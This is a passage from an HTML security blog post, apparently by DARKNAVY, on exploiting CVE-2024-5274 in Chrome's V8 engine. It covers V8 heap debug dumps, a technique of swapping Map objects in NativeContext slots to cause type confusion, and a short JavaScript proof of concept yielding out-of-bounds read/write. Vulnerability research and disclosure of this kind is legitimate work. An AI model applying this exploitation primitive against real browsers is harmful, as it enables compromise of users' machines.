</span></span><span class=line><span class=cl>    <span class=o>%</span><span class=nx>DebugPrint</span><span class=p>(</span><span class=nx>o2</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=c1>// ...
</span></span></span><span class=line><span class=cl><span class=c1></span>  <span class=p>}</span>
</span></span><span class=line><span class=cl><span class=c1>// ...
</span></span></span></code></pre></div><p>The corresponding source code for these objects can be found <a href="https://source.chromium.org/chromium/chromium/src/+/main:v8/src/objects/contexts.h;drc=1f14cc876cc5bf899d13284a12c451498219bb2d;l=44">here</a>. The dumped <a href=https://github.com/DarkNavySecurity/PoC/blob/main/CVE-2024-5274/native_context_objs.txt>results</a> have also been made public.</p><h3 id=playing-with-nativecontext>Playing with NativeContext<a hidden class=anchor aria-hidden=true href=#playing-with-nativecontext>#</a></h3><p>At this point, we can arbitrarily access objects within the <code>NativeContext</code>, which includes many objects that are normally inaccessible during JavaScript execution. For example, we can directly access a <code>FixedDoubleArray</code> within a double-typed array (the structure that actually stores the elements).</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-C data-lang=C><span class=line><span class=cl><span class=c1>// o155 in slot 157
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=nl>DebugPrint</span><span class=p>:</span> <span class=mh>0x272f000d1ba1</span><span class=o>:</span> <span class=p>[</span><span class=n>FixedDoubleArray</span><span class=p>]</span> <span class=n>in</span> <span class=n>OldSpace</span>
</span></span><span class=line><span class=cl> <span class=o>-</span> <span class=nl>map</span><span class=p>:</span> <span class=mh>0x272f0000090d</span> <span class=o>&lt;</span><span class=nf>Map</span><span class=p>(</span><span class=n>FIXED_DOUBLE_ARRAY_TYPE</span><span class=p>)</span><span class=o>&gt;</span>
</span></span><span class=line><span class=cl> <span class=o>-</span> <span class=nl>length</span><span class=p>:</span> <span class=mi>64</span>
</span></span><span class=line><span class=cl>        <span class=mi>0</span><span class=o>-</span><span class=mi>63</span><span class=o>:</span> <span class=mi>0</span>
</span></span><span class=line><span class=cl><span class=mh>0x272f0000090d</span><span class=o>:</span> <span class=p>[</span><span class=n>Map</span><span class=p>]</span> <span class=n>in</span> <span class=n>ReadOnlySpace</span>
</span></span><span class=line><span class=cl> <span class=o>-</span> <span class=nl>type</span><span class=p>:</span> <span class=n>FIXED_DOUBLE_ARRAY_TYPE</span>
</span></span><span class=line><span class=cl> <span class=o>-</span> <span class=n>instance</span> <span class=nl>size</span><span class=p>:</span> <span class=n>variable</span>
</span></span><span class=line><span class=cl> <span class=o>-</span> <span class=n>elements</span> <span class=nl>kind</span><span class=p>:</span> <span class=n>HOLEY_DOUBLE_ELEMENTS</span>
</span></span><span class=line><span class=cl> <span class=o>-</span> <span class=n>unused</span> <span class=n>property</span> <span class=nl>fields</span><span class=p>:</span> <span class=mi>0</span>
</span></span><span class=line><span class=cl> <span class=o>-</span> <span class=k>enum</span> <span class=nl>length</span><span class=p>:</span> <span class=n>invalid</span>
</span></span><span class=line><span class=cl> <span class=o>-</span> <span class=n>stable_map</span>
</span></span><span class=line><span class=cl> <span class=o>-</span> <span class=n>back</span> <span class=nl>pointer</span><span class=p>:</span> <span class=mh>0x272f00000251</span> <span class=o>&lt;</span><span class=n>undefined</span><span class=o>&gt;</span>
</span></span><span class=line><span class=cl> <span class=o>-</span> <span class=n>prototype_validity</span> <span class=nl>cell</span><span class=p>:</span> <span class=mi>0</span>
</span></span><span class=line><span class=cl> <span class=o>-</span> <span class=n>instance</span> <span class=nf>descriptors</span> <span class=p>(</span><span class=n>own</span><span class=p>)</span> <span class=err>#</span><span class=mi>0</span><span class=o>:</span> <span class=mh>0x272f00000295</span> <span class=o>&lt;</span><span class=n>DescriptorArray</span><span class=p>[</span><span class=mi>0</span><span class=p>]</span><span class=o>&gt;</span>
</span></span><span class=line><span class=cl> <span class=o>-</span> <span class=nl>prototype</span><span class=p>:</span> <span class=mh>0x272f00000235</span> <span class=o>&lt;</span><span class=n>null</span><span class=o>&gt;</span>
</span></span><span class=line><span class=cl> <span class=o>-</span> <span class=nl>constructor</span><span class=p>:</span> <span class=mh>0x272f00000235</span> <span class=o>&lt;</span><span class=n>null</span><span class=o>&gt;</span>
</span></span><span class=line><span class=cl> <span class=o>-</span> <span class=n>dependent</span> <span class=nl>code</span><span class=p>:</span> <span class=mh>0x272f00000229</span> <span class=o>&lt;</span><span class=n>Other</span> <span class=n>heap</span> <span class=nf>object</span> <span class=p>(</span><span class=n>WEAK_ARRAY_LIST_TYPE</span><span class=p>)</span><span class=o>&gt;</span>
</span></span><span class=line><span class=cl> <span class=o>-</span> <span class=n>construction</span> <span class=nl>counter</span><span class=p>:</span> <span class=mi>0</span>
</span></span></code></pre></div><p>However, attempting to use this type results in a crash.</p><img src=assets/image-20240702174655522.png style=display:block;margin-left:auto;margin-right:auto;zoom:70%><p>This is because these types cannot be directly manipulated from JavaScript. Apart from some basic types, only types belonging to <code>JSObject</code> can be operated on by scripts.</p><p>Further research into other objects in the <code>NativeContext</code> reveals a large number of Map types.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-C data-lang=C><span class=line><span class=cl><span class=c1>// o151 in slot 153
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=nl>DebugPrint</span><span class=p>:</span> <span class=mh>0x272f000d1b39</span><span class=o>:</span> <span class=p>[</span><span class=n>Map</span><span class=p>]</span> <span class=n>in</span> <span class=n>OldSpace</span>
</span></span><span class=line><span class=cl> <span class=o>-</span> <span class=nl>type</span><span class=p>:</span> <span class=n>JS_MAP_KEY_VALUE_ITERATOR_TYPE</span>
</span></span><span class=line><span class=cl> <span class=o>-</span> <span class=n>instance</span> <span class=nl>size</span><span class=p>:</span> <span class=mi>20</span>
</span></span><span class=line><span class=cl> <span class=o>-</span> <span class=n>inobject</span> <span class=nl>properties</span><span class=p>:</span> <span class=mi>0</span>
</span></span><span class=line><span class=cl> <span class=o>-</span> <span class=n>elements</span> <span class=nl>kind</span><span class=p>:</span> <span class=n>HOLEY_ELEMENTS</span>
</span></span><span class=line><span class=cl> <span class=o>-</span> <span class=n>unused</span> <span class=n>property</span> <span class=nl>fields</span><span class=p>:</span> <span class=mi>0</span>
</span></span><span class=line><span class=cl> <span class=o>-</span> <span class=k>enum</span> <span class=nl>length</span><span class=p>:</span> <span class=n>invalid</span>
</span></span><span class=line><span class=cl> <span class=o>-</span> <span class=n>stable_map</span>
</span></span><span class=line><span class=cl> <span class=o>-</span> <span class=n>back</span> <span class=nl>pointer</span><span class=p>:</span> <span class=mh>0x272f00000251</span> <span class=o>&lt;</span><span class=n>undefined</span><span class=o>&gt;</span>
</span></span><span class=line><span class=cl> <span class=o>-</span> <span class=n>prototype_validity</span> <span class=nl>cell</span><span class=p>:</span> <span class=mh>0x272f00000ac5</span> <span class=o>&lt;</span><span class=n>Cell</span> <span class=n>value</span><span class=o>=</span> <span class=mi>1</span><span class=o>&gt;</span>
</span></span><span class=line><span class=cl> <span class=o>-</span> <span class=n>instance</span> <span class=nf>descriptors</span> <span class=p>(</span><span class=n>own</span><span class=p>)</span> <span class=err>#</span><span class=mi>0</span><span class=o>:</span> <span class=mh>0x272f00000295</span> <span class=o>&lt;</span><span class=n>DescriptorArray</span><span class=p>[</span><span class=mi>0</span><span class=p>]</span><span class=o>&gt;</span>
</span></span><span class=line><span class=cl> <span class=o>-</span> <span class=nl>prototype</span><span class=p>:</span> <span class=mh>0x272f000d1251</span> <span class=o>&lt;</span><span class=n>Object</span> <span class=n>map</span> <span class=o>=</span> <span class=mh>0x272f000d11e5</span><span class=o>&gt;</span>
</span></span><span class=line><span class=cl> <span class=o>-</span> <span class=nl>constructor</span><span class=p>:</span> <span class=mh>0x272f000d1b19</span> <span class=o>&lt;</span><span class=n>JSFunction</span> <span class=nf>MapIterator</span> <span class=p>(</span><span class=n>sfi</span> <span class=o>=</span> <span class=mh>0x272f00091e29</span><span class=p>)</span><span class=o>&gt;</span>
</span></span><span class=line><span class=cl> <span class=o>-</span> <span class=n>dependent</span> <span class=nl>code</span><span class=p>:</span> <span class=mh>0x272f00000229</span> <span class=o>&lt;</span><span class=n>Other</span> <span class=n>heap</span> <span class=nf>object</span> <span class=p>(</span><span class=n>WEAK_ARRAY_LIST_TYPE</span><span class=p>)</span><span class=o>&gt;</span>
</span></span><span class=line><span class=cl> <span class=o>-</span> <span class=n>construction</span> <span class=nl>counter</span><span class=p>:</span> <span class=mi>0</span>
</span></span><span class=line><span class=cl> <span class=p>...</span>
</span></span></code></pre></div><p>A Map is a fundamental and important type in V8, determining the type of a variable. If we can manipulate Maps, we can create a powerful exploitation primitive: Type Confusion.</p><p>In certain scenarios, V8 reads Maps from the <code>NativeContext</code> to create objects. For example, in <a href="https://source.chromium.org/chromium/chromium/src/+/main:v8/src/builtins/promise-all.tq;drc=ec53113a6d7d95cf8b255aec7fc91b17acd33d80;l=309">src/builtins/promise-all.tq</a>:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-javascript data-lang=javascript><span class=line><span class=cl>      <span class=kr>const</span> <span class=nx>arrayMap</span> <span class=o>=</span>
</span></span><span class=line><span class=cl>          <span class=o>*</span><span class=nx>NativeContextSlot</span><span class=p>(</span>
</span></span><span class=line><span class=cl>          <span class=nx>nativeContext</span><span class=p>,</span> <span class=nx>ContextSlot</span><span class=o>::</span><span class=nx>JS_ARRAY_PACKED_ELEMENTS_MAP_INDEX</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=c1>// ...
</span></span></span><span class=line><span class=cl><span class=c1></span>      <span class=kr>const</span> <span class=nx>valuesArray</span> <span class=o>=</span> <span class=nx>NewJSArray</span><span class=p>(</span><span class=nx>arrayMap</span><span class=p>,</span> <span class=nx>values</span><span class=p>);</span>
</span></span></code></pre></div><p>Although we cannot directly modify the Map objects, the <code>NativeContext</code> contains many Maps. If we read a Map from one slot and overwrite another slot&rsquo;s Map with it, can we cause type confusion? The answer is yes!</p><p>The following code is a simple PoC:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-javascript data-lang=javascript><span class=line><span class=cl><span class=kd>function</span> <span class=nx>f1</span><span class=p>()</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>  <span class=kd>function</span> <span class=nx>hax</span><span class=p>()</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=c1>// o60 is JS_ARGUMENTS_OBJECT_TYPE map with FAST_SLOPPY_ARGUMENTS_ELEMENTS
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=c1>// o110 is JS_ARRAY_TYPE map with PACKED_DOUBLE_ELEMENTS
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=nx>o60</span> <span class=o>=</span> <span class=nx>o110</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=p>}</span>
</span></span><span class=line><span class=cl>  <span class=c1>// ...
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=p>}</span>
</span></span><span class=line><span class=cl><span class=c1>// ...
</span></span></span><span class=line><span class=cl><span class=c1></span>
</span></span><span class=line><span class=cl><span class=kd>function</span> <span class=nx>hax2</span><span class=p>(</span><span class=nx>a0</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>  <span class=c1>// `arguments` is confused to double array now
</span></span></span><span class=line><span class=cl><span class=c1></span>  <span class=o>%</span><span class=nx>DebugPrint</span><span class=p>(</span><span class=nx>arguments</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl><span class=nx>hax2</span><span class=p>();</span>
</span></span></code></pre></div><p>In the PoC, we confused the function&rsquo;s <code>arguments</code> with a double-element array, causing an OOB read/write. By achieving this type confusion, we can proceed with the classic V8 exploitation techniques. The related <a href=https://github.com/DarkNavySecurity/PoC/tree/main/CVE-2024-5274>PoC</a> code and all native objects definitions have been made public in our GitHub repository.</p><p>Thus, through a seemingly insignificant issue in the parser, we managed to create a powerful exploitation primitive, allowing us to arbitrarily confuse different types within the JavaScript engine.</p></div><footer class=post-footer><ul class=post-tags></ul><nav class=paginav><a class=next href=https://www.darknavy.org/blog/exploiting_steam_usual_and_unusual_ways_in_the_cef_framework/><span class=title>Next »</span><br><span>Exploiting Steam: Usual and Unusual Ways in the CEF Framework</span></a></nav></footer></article></main><footer class=footer><span>&copy; 2024 <a href=https://www.darknavy.org/>DARKNAVY</a></span> ·
<span>Powered by
<a href=https://gohugo.io/ rel="noopener noreferrer" target=_blank>Hugo</a> &
        <a href=https://github.com/adityatelange/hugo-PaperMod/ rel=noopener target=_blank>PaperMod</a></span></footer><a href=#top aria-label="go to top" title="Go to Top (Alt + G)" class=top-link id=top-link accesskey=g><svg viewBox="0 0 12 6" fill="currentcolor"><path d="M12 6H0l6-6z"/></svg>
</a><script>let menu=document.getElementById("menu");menu&&(menu.scrollLeft=localStorage.getItem("menu-scroll-position"),menu.onscroll=function(){localStorage.setItem("menu-scroll-position",menu.scrollLeft)}),document.querySelectorAll('a[href^="#"]').forEach(e=>{e.addEventListener("click",function(e){e.preventDefault();var t=this.getAttribute("href").substr(1);window.matchMedia("(prefers-reduced-motion: reduce)").matches?document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView():document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView({behavior:"smooth"}),t==="top"?history.replaceState(null,null," "):history.pushState(null,null,`#${t}`)})})</script><script>var mybutton=document.getElementById("top-link");window.onscroll=function(){document.body.scrollTop>800||document.documentElement.scrollTop>800?(mybutton.style.visibility="visible",mybutton.style.opacity="1"):(mybutton.style.visibility="hidden",mybutton.style.opacity="0")}</script></body></html>